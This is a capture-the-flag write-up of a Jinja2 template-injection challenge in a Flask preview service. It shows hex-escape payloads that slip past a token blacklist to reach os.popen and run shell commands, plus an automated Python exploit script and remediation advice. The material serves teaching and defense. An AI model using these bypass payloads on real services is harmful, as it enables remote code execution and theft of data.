---
title: "Conduit Preview — SSTI Filter Bypass"
description: "The target was a small Flask/Werkzeug label-preview service:"
event: "cryovault"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CryoVault Finals 2026","web"]
date: "2026-10-26"
teammate: false
source: "cryovault/web/2/writeup.md"
---

**Challenge:** Label-preview service  
**Flag:** `isfcr{ss71_h3x_f1lt3r_byp4ss_c0ndu1t_e4d1}`

## Overview

The target was a small Flask/Werkzeug label-preview service:

```text
conduit preview
---------------
POST /preview  {"label":"..."}  -> renders your label into the card.
The preview engine is template-based. Some inputs are filtered.
```

The word "template" suggested a server-side template injection (SSTI) challenge. The service accepted a JSON body with a `label` field and rendered it inside:

```html
<div class=card><b>...</b></div>
```

## Reconnaissance

A normal request returned the label unchanged:

```bash
curl -sS -X POST https://isfcrpesu-conduit.chals.io/preview \
  -H 'Content-Type: application/json' \
  -d '{"label":"hello"}'
```

```html
<div class=card><b>hello</b></div>
```

Sending a Jinja expression produced the evaluated result:

```bash
curl -sS -X POST https://isfcrpesu-conduit.chals.io/preview \
  -H 'Content-Type: application/json' \
  -d '{"label":"{{7*7}}"}'
```

```html
<div class=card><b>49</b></div>
```

String multiplication also worked, confirming Jinja2-style template evaluation:

```text
{{7*'7'}} -> 7777777
```

## Filter Behaviour

Some payloads were rejected with a `400` response and an explicit blocked token:

```text
blocked token: config
blocked token: __
blocked token: request
blocked token: class
blocked token: globals
blocked token: os
blocked token: popen
```

Direct access to dangerous Jinja/Flask globals such as `config`, `request`, `__class__`, `__globals__`, `os`, and `popen` was therefore blocked.

However, the filter appeared to inspect the raw template source text. Jinja2 decodes Python-style string escapes before evaluation, so the blocked words could be represented as hex escapes.

For example:

```jinja2
'\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'
```

is evaluated by Jinja as:

```text
__globals__
```

while the raw request contains none of the blocked substrings.

## Exploiting the SSTI

The built-in Jinja function `lipsum` was available. Accessing its globals dictionary exposed the imported `os` module:

```jinja2
{{ lipsum.__globals__['os'] }}
```

Both `__globals__` and `os` were blocked literally, so they were hex-encoded:

| Value | Hex-encoded form |
|---|---|
| `__globals__` | `\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f` |
| `os` | `\x6f\x73` |
| `popen` | `\x70\x6f\x70\x65\x6e` |
| `read` | `\x72\x65\x61\x64` |

The resulting payload was:

```jinja2
{{(lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))['\x6f\x73']|attr('\x70\x6f\x70\x65\x6e')('id')|attr('\x72\x65\x61\x64')()}}
```

This executed `id` and returned:

```text
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

The parentheses around `lipsum|attr(...)` were necessary so that the dictionary lookup could be applied to the filter result.

## Retrieving the Flag

The same payload was then used with a shell command. Listing the filesystem showed `/chall` and the process working directory:

```text
PWD=/chall
```

Reading the flag from the filesystem:

```jinja2
{{(lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))['\x6f\x73']|attr('\x70\x6f\x70\x65\x6e')('cat /flag*')|attr('\x72\x65\x61\x64')()}}
```

returned:

```text
isfcr{ss71_h3x_f1lt3r_byp4ss_c0ndu1t_e4d1}
```

## Automated Exploit

```python
import requests

URL = "https://isfcrpesu-conduit.chals.io/preview"

GLOBALS = r"\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f"  # __globals__
OS      = r"\x6f\x73"                                      # os
POPEN   = r"\x70\x6f\x70\x65\x6e"                          # popen
READ    = r"\x72\x65\x61\x64"                              # read

def run(command: str) -> str:
    payload = (
        "{{("
        f"lipsum|attr('{GLOBALS}')"
        f")['{OS}']"
        f"|attr('{POPEN}')('{command}')"
        f"|attr('{READ}')()"
        "}}"
    )
    response = requests.post(URL, json={"label": payload}, timeout=30)
    response.raise_for_status()
    return response.text

print(run("id"))
print(run("cat /flag*"))
```

## Root Cause

The application renders user-controlled input as a Jinja2 template and relies on a blacklist to remove dangerous tokens. Blacklisting raw substrings is insufficient because the template engine supports escape sequences and other equivalent forms of expression. Once template evaluation is available, an attacker can reach Python objects through Jinja's globals and often obtain command execution.

## Remediation

- Do not render untrusted input as a template. Pass it as a template variable instead:

  ```python
  render_template_string("<div class=card><b>{{ label }}</b></div>", label=user_input)
  ```

- Prefer autoescaping and context-aware templating.
- If templating user input is unavoidable, use a sandboxed environment and an allowlist of permitted expressions/variables.
- Do not rely on string blacklists for security.
- Run the service with the least privileges required and keep flag files outside the application's readable paths where possible.
